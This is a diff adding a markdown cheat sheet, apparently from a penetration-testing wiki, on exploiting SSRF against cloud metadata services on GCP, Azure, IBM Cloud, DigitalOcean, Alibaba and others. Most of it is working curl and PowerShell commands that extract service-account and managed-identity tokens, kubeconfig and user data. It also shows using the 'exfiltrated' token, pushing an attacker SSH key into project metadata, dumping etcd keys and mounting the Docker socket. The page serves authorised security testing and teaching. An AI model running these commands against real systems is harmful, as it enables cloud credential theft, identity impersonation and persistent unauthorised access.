@@ -1,0 +1,497 @@
+# Cloud SSRF - GCP, Azure, and Other Providers
+
+## GCP
+
+You can [**find here the docs about metadata endpoints**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).
+
+### SSRF URL for Google Cloud
+
+Requires the HTTP header **`Metadata-Flavor: Google`** and you can access the metadata endpoint in with the following URLs:
+
+- [http://169.254.169.254](http://169.254.169.254)
+- [http://metadata.google.internal](http://metadata.google.internal)
+- [http://metadata](http://metadata)
+
+Interesting endpoints to extract information:
+
+```bash
+# /project
+# Project name and number
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+# Project attributes
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true
+
+# /oslogin
+# users
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
+# groups
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
+# security-keys
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
+# authorize
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize
+
+# /instance
+# Description
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
+# Hostname
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Image
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
+# Machine Type
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
+# Name
+curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
+# Tags
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# User data
+curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
+# Network Interfaces
+for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
+    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
+    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
+    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
+    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
+    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
+    echo "  ==============  "
+done
+# Service Accounts
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+# K8s Attributtes
+## Cluster location
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
+## Cluster name
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
+## Os-login enabled
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
+## Kube-env
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
+## Kube-labels
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
+## Kubeconfig
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig
+
+# All custom project attributes
+curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+
+# All custom project attributes instance attributes
+curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
+    -H "Metadata-Flavor: Google"
+```
+
+Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
+
+```
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+> [!CAUTION]
+> In order to **use the exfiltrated service account token** you can just do:
+>
+> ```bash
+> # Via env vars
+> export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
+> gcloud projects list
+>
+> # Via setup
+> echo "<token>" > /some/path/to/token
+> gcloud config set auth/access_token_file /some/path/to/token
+> gcloud projects list
+> gcloud config unset auth/access_token_file
+> ```
+
+### Add an SSH key
+
+Extract the token
+
+```
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+```
+
+Check the scope of the token (with the previous output or running the following)
+
+```bash
+curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
+        "issued_to": "101302079XXXXX",
+        "audience": "10130207XXXXX",
+        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
+        "expires_in": 2443,
+        "access_type": "offline"
+}
+```
+
+Now push the SSH key.
+
+```bash
+curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
+-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
+-H "Content-Type: application/json"
+--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
+```
+
+### Cloud Functions
+
+The metadata endpoint works the same as in VMs but without some endpoints:
+
+```bash
+# /project
+# Project name and number
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
+
+# /instance
+# ID
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
+# Zone
+curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
+# Auto MTLS config
+curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/platform-security/auto-mtls-configuration
+# Service Accounts
+for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
+    echo "  Name: $sa"
+    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
+    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
+    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
+    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
+    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
+    echo "  ==============  "
+done
+```
+
+## Digital Ocean
+
+> [!WARNING]
+> There isn't things like AWS Roles or GCP service account, so don't expect to find metadata bot credentials
+
+Documentation available at [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
+
+```
+curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
+curl http://169.254.169.254/metadata/v1.json | jq
+```
+
+## Azure
+
+### Azure VM
+
+[**Docs** in here](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).
+
+- **Must** contain the header `Metadata: true`
+- Must **not** contain an `X-Forwarded-For` header
+
+> [!TIP]
+> An Azure VM can have attached 1 system managed identity and several user managed identities. Which basically means that you can **impersonate all the managed identities attached to a VM**.
+>
+> When requesting an access token to the metadata endpoint, by default the metadata service will use the **system assigned managed identity** to generate the token, if there is any system assigned managed identity. In case there is just **ONE user assigned managed identity**, then this will be used by default. However, in case there is no system assigned managed identity and there are **multiple user assigned managed identities**, then the metadata service will return an error indicating that there are multiple managed identities and it's necessary to **specify which one to use**.
+>
+> Unfortunately I couldn't find any metadata endpoint indicating all the MIs a VM has attached, so finding out all the assigned managed identities to a VM could be a hard task from a Red Team perspective.
+>
+> Therefore, to find all the attached MIs you can do:
+>
+> - Get **attached identities with az cli** (if you have already compromised a principal in the Azure tenant with the permission `Microsoft.Compute/virtualMachines/read`)
+>
+> ```bash
+> az vm identity show \
+>  --resource-group <rsc-group> \
+>  --name <vm-name>
+> ```
+>
+> - Get **attached identities** using the default attached MI in the metadata:
+>
+> ```bash
+> export API_VERSION="2021-12-13"
+>
+> # Get token from default MI
+> export TOKEN=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/" \
+>  | jq -r '.access_token')
+>
+> # Get needed details
+> export SUBSCRIPTION_ID=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.subscriptionId')
+> export RESOURCE_GROUP=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.resourceGroupName')
+> export VM_NAME=$(curl -s -H "Metadata:true" \
+>  "http://169.254.169.254/metadata/instance?api-version=$API_VERSION" | jq -r '.compute.name')
+>
+> # Try to get attached MIs
+> curl -s -H "Authorization: Bearer $TOKEN" \
+>  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/$RESOURCE_GROUP/providers/Microsoft.Compute/virtualMachines/$VM_NAME?api-version=$API_VERSION" | jq
+> ```
+>
+> - **Get all** the defined managed identities in the tenant and **brute force** to see if any of them is attached to the VM (the permission `Microsoft.ManagedIdentity/userAssignedIdentities/read` is needed):
+>
+> ```bash
+> az identity list
+> ```
+
+> [!CAUTION]
+> In the token requests use any of the parameters `object_id`, `client_id` or `msi_res_id` to indicate the managed identity you want to use ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)). If none, the **default MI will be used**.
+
+{{#tabs}}
+{{#tab name="Bash"}}
+
+```bash
+HEADER="Metadata:true"
+URL="http://169.254.169.254/metadata"
+API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions
+
+echo "Instance details"
+curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"
+
+echo "Load Balancer details"
+curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"
+
+echo "Management Token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"
+
+echo "Graph token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"
+
+echo "Vault token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"
+
+echo "Storage token"
+curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
+```
+
+{{#endtab}}
+
+{{#tab name="PS"}}
+
+```bash
+# Powershell
+Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
+## User data
+$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+
+## Get management token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" -Headers @{"Metadata"="true"}).access_token
+
+## Get graph token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://graph.microsoft.com/" -Headers @{"Metadata"="true"}).access_token
+
+## Get vault token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/" -Headers @{"Metadata"="true"}).access_token
+
+## Get storage token
+(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com/" -Headers @{"Metadata"="true"}).access_token
+
+# More Paths
+/metadata/instance?api-version=2017-04-02
+/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+/metadata/instance/compute/userData?api-version=2021-01-01&format=text
+```
+
+{{#endtab}}
+{{#endtabs}}
+
+> [!WARNING]
+> Note that the endpoint **`http://169.254.169.254/metadata/v1/instanceinfo` doesn't require the `Metadata: True` header** which is great to show impact in SSRF vulnerabilities in Azure were you cannot add this header.
+
+### Azure App & Functions Services & Automation Accounts
+
+From the **env** you can get the values of **`IDENTITY_HEADER`** and **`IDENTITY_ENDPOINT`**. That you can use to gather a token to speak with the metadata server.
+
+Most of the time, you want a token for one of these resources:
+
+- [https://storage.azure.com](https://storage.azure.com/)
+- [https://vault.azure.net](https://vault.azure.net/)
+- [https://graph.microsoft.com](https://graph.microsoft.com/)
+- [https://management.azure.com](https://management.azure.com/)
+
+> [!CAUTION]
+> In the token requests use any of the parameters `object_id`, `client_id` or `msi_res_id` to indicate the managed identity you want to use ([**docs**](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token)). If none, the **default MI will be used**.
+
+{{#tabs}}
+{{#tab name="Bash"}}
+
+```bash
+# Check for those env vars to know if you are in an Azure app
+echo $IDENTITY_HEADER
+echo $IDENTITY_ENDPOINT
+
+# (Fingerprint) You should also be able to find the folder:
+ls /opt/microsoft
+
+# Get management token
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+# Get graph token
+curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+# Get vault token
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+# Get storage token
+curl "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2019-08-01" -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+```
+
+{{#endtab}}
+
+{{#tab name="PS"}}
+
+```bash
+# Define the API version
+$API_VERSION = "2019-08-01"
+
+# Function to get a token for a specified resource
+function Get-Token {
+    param (
+        [string]$Resource
+    )
+    $url = "$IDENTITY_ENDPOINT?resource=$Resource&api-version=$API_VERSION"
+    $headers = @{
+        "X-IDENTITY-HEADER" = $IDENTITY_HEADER
+    }
+    try {
+        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get
+        $response.access_token
+    } catch {
+        Write-Error "Error obtaining token for $Resource: $_"
+    }
+}
+
+# Get Management Token
+$managementToken = Get-Token -Resource "https://management.azure.com/"
+Write-Host "Management Token: $managementToken"
+
+# Get Graph Token
+$graphToken = Get-Token -Resource "https://graph.microsoft.com/"
+Write-Host "Graph Token: $graphToken"
+
+# Get Vault Token
+$vaultToken = Get-Token -Resource "https://vault.azure.net/"
+Write-Host "Vault Token: $vaultToken"
+
+# Get Storage Token
+$storageToken = Get-Token -Resource "https://storage.azure.com/"
+Write-Host "Storage Token: $storageToken"
+
+# Using oneliners
+
+## Get management token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Get graph token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Get vault token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://vault.azure.net/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Get storage token
+(Invoke-RestMethod -Uri "${env:IDENTITY_ENDPOINT}?resource=https://storage.azure.com/&api-version=2019-08-01" -Headers @{ "X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER" }).access_token
+
+## Remember that in Automation Accounts it might be declared the client ID of the assigned user managed identity inside the variable that can be gatehred with:
+Get-AutomationVariable -Name 'AUTOMATION_SC_USER_ASSIGNED_IDENTITY_ID'
+```
+
+{{#endtab}}
+{{#endtabs}}
+
+## IBM Cloud
+
+> [!WARNING]
+> Note that in IBM by default metadata is not enabled, so it's possible that you won't be able to access it even if you are inside an IBM cloud VM
+
+```bash
+export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
+  -H "Metadata-Flavor: ibm"\
+  -H "Accept: application/json"\
+  -d '{
+        "expires_in": 3600
+      }' | jq -r '(.access_token)'`
+
+# Get instance details
+curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq
+
+# Get SSH keys info
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq
+
+# Get SSH keys fingerprints & user data
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq
+
+# Get placement groups
+curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq
+
+# Get IAM credentials
+curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
+```
+
+Documentation for various platforms' metadata services is outlined below, highlighting the methods through which configuration and runtime information for instances can be accessed. Each platform offers unique endpoints to access its metadata services.
+
+## Packetcloud
+
+For accessing Packetcloud's metadata, the documentation can be found at: [https://metadata.packet.net/userdata](https://metadata.packet.net/userdata)
+
+## OpenStack/RackSpace
+
+The necessity for a header is not mentioned. Metadata can be accessed through:
+
+- `http://169.254.169.254/openstack`
+
+## HP Helion
+
+The necessity for a header is not mentioned here either. Metadata is accessible at:
+
+- `http://169.254.169.254/2009-04-04/meta-data/`
+
+## Oracle Cloud
+
+Oracle Cloud provides a series of endpoints for accessing various metadata aspects:
+
+- `http://192.0.0.192/latest/`
+- `http://192.0.0.192/latest/user-data/`
+- `http://192.0.0.192/latest/meta-data/`
+- `http://192.0.0.192/latest/attributes/`
+
+## Alibaba
+
+Alibaba offers endpoints for accessing metadata, including instance and image IDs:
+
+- `http://100.100.100.200/latest/meta-data/`
+- `http://100.100.100.200/latest/meta-data/instance-id`
+- `http://100.100.100.200/latest/meta-data/image-id`
+
+## Kubernetes ETCD
+
+Kubernetes ETCD can hold API keys, internal IP addresses, and ports. Access is demonstrated through:
+
+- `curl -L http://127.0.0.1:2379/version`
+- `curl http://127.0.0.1:2379/v2/keys/?recursive=true`
+
+## Docker
+
+Docker metadata can be accessed locally, with examples given for container and image information retrieval:
+
+- Simple example to access containers and images metadata via the Docker socket:
+  - `docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash`
+  - Inside the container, use curl with the Docker socket:
+    - `curl --unix-socket /var/run/docker.sock http://foo/containers/json`
+    - `curl --unix-socket /var/run/docker.sock http://foo/images/json`
+
+## Rancher
+
+Rancher's metadata can be accessed using:
+
+- `curl http://rancher-metadata/<version>/<path>`
